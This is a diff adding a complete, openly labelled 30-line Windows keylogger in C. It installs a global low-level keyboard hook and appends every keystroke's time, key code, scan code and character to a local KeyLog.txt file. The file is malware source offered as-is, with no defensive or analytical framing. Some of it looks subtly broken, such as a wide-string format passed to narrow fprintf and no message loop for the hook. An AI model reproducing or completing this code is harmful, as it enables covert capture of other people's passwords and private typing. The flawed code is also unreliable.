@@ -1,0 +1,37 @@
+// 30-line KeyLogger
+#include <stdio.h>
+#include <windows.h>
+
+FILE* file;
+
+LRESULT CALLBACK LowLevelKeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam){
+	if(wParam == WM_KEYDOWN){
+		//FILE* file;
+		LPKBDLLHOOKSTRUCT kb = (LPKBDLLHOOKSTRUCT)lParam;
+		//WCHAR szLine[128];
+		//_wfopen_s(&file, L"KeyLog.txt", L"a,ccs=UTF-8");
+		//if(file == NULL) ;
+		fprintf(file, L"%d>  0x%X  |  0x%X  |  %c \n", kb->time, kb->vkCode, kb->scanCode, (WCHAR)MapVirtualKeyW(kb->vkCode, MAPVK_VK_TO_CHAR));
+		//fwrite(szLine, sizeof(WCHAR), wcslen(szLine), file);
+		//fwrite(L"\n", sizeof(WCHAR), 1, file);
+		//fclose(file);
+	}
+	return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow){
+	
+	//GetModuleFileNameW(GetModuleHandleW(NULL), szFile, MAX_PATH);
+	//PathRemoveFileSpecW(szFile);
+	//_snwprintf_s(szFile, MAX_PATH, MAX_PATH, L"%s\\KeyLog.txt", szFile);
+
+	file = fopen("KeyLog.txt", "a,ccs=UTF-8");
+	
+	SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
+
+	//MSG msg;
+	// Main message loop:
+	//GetMessageW(&msg, NULL, 0, 0);
+	Sleep(INFINITE);
+	return 0;// (int)msg.wParam;
+}
